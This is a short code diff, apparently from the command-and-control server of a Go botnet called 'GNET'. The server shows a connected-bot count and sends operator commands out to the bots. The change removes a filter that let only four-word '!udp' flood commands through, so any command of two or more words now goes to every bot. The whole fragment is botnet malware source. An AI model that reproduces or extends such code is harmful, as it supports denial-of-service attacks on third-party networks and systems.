@@ -170,10 +170,8 @@ func ClientHandler(Connection net.Conn) {
 			Output = "\r\033[35m[GNET] - " + BOT_COUNT + " bots\033[0m"
 		}
 
-		if len(strings.Split(Command, " ")) == 4 {
-			if strings.Split(Command, " ")[0] == "!udp" {
-				go bot.SendCommandToBots(Command)
-			}
+		if len(strings.Split(Command, " ")) >= 2 {
+			go bot.SendCommandToBots(Command)
 		}
 	}
 }
